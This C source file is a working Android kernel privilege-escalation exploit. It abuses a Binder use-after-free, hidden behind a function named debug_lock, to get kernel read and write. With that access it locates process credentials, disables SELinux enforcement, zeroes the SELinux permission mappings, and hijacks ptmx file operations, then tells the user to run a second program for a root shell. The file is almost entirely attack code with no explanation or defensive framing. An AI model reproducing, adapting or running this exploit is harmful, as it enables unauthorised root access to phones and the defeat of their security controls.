#include "common.c"

struct selinux_mapping {
	uint16_t value;
	unsigned num_perms;
	uint32_t perms[32];
};

size_t debug_lock() {
	ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);

	if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event))
		err(1, "epoll_add");

	memset(ioa, 0, sizeof(ioa));
	ioa[IOV_INDEX - 1].iov_base = dummy_page;
	ioa[IOV_INDEX - 1].iov_len = PAGE_SIZE;
	ioa[IOV_INDEX + 3].iov_base = dummy_page;
	ioa[IOV_INDEX + 3].iov_len = PAGE_SIZE;

	pipe(pipefd);
	fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE);

	uint8_t buf[PAGE_SIZE];
	int pid = fork();
	if (pid == -1)
		err(1, "fork");
	if (pid == 0) {
		close(pipefd[1]);
		usleep(DELAY_USEC);
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
		read(pipefd[0], buf, PAGE_SIZE);
		exit(0);
	}
	ioctl(fd, BINDER_THREAD_EXIT, NULL);
	ssize_t bytes = writev(pipefd[1], ioa, IOV_SIZE);
	close(pipefd[0]);
	close(pipefd[1]);
	return bytes;
}

int main() {
	initialize();
	uint8_t buf[2 * PAGE_SIZE];
	int retry = 0;
	puts("toggling debug_lock");
	while(debug_lock() != PAGE_SIZE) {
		if(++retry == 3)
			errx(1, "give up, maybe device is invulnerable");
		printf("debug_lock failed, retrying #%d\n", retry);
	}
	retry = 0;
	puts("leaking data");
	while(leak_data(buf) != PAGE_SIZE) {
		if(++retry == 3)
			errx(1, "give up, maybe IOV_INDEX is incorrect");
		printf("leak failed, retrying #%d\n", retry);
	}

	uint64_t cred_addr = *(uint64_t *)(buf + TASK_cred);
	if (cred_addr < 0xF000000000000000)
		errx(1, "invalid cred_addr");

	puts("reading struct cred");
	kernel_read(cred_addr, buf, CRED_SIZE);
	if (*(uint32_t *)(buf + CRED_uid) != getuid())
		errx(1, "getcred error");
	offset = *(uint64_t *)(buf + CRED_user_ns) - ADDR_init_user_ns;

	printf("offset: %lx\n", offset);

	uint8_t policydb = 2;
	kernel_write(ADDR_policydb + offset + 0x1cc, &policydb, 0x1);

	puts("reading selinux mapping");
	uint64_t mapping;
	uint16_t mapping_size;
	kernel_read(ADDR_current_mapping + offset, &mapping, 0x8);
	kernel_read(ADDR_current_mapping_size + offset, &mapping_size, 0x2);

	struct selinux_mapping *semap = buf;
	kernel_read(mapping, buf, PAGE_SIZE);
	kernel_read(mapping + PAGE_SIZE, buf + PAGE_SIZE, PAGE_SIZE);
	for (int i = 0; i < mapping_size; i++) {
		semap[i].num_perms = 32;
		for (int j = 0; j < 32; j++)
			semap[i].perms[j] = 0;
	}
	puts("patching selinux mapping");
	kernel_write(mapping, buf, PAGE_SIZE);
	kernel_write(mapping + PAGE_SIZE, buf + PAGE_SIZE, PAGE_SIZE);

	puts("overwriting ptmx_fops");
	uint64_t ptmx_fops = ADDR_avc_ss_reset + offset;
	kernel_write(ADDR_ptmx_fops + offset + 8 * 20, &ptmx_fops, 0x8);

	int ptmx = open("/dev/ptmx", O_RDONLY);
	if (!ptmx)
		err(1, "open /dev/ptmx");
	puts("calling avc_ss_reset(0x40000)");
	fcntl(ptmx, F_SETFL, 0x40000);
	puts("done, use ./poc to get a root shell");
	return 0;
}
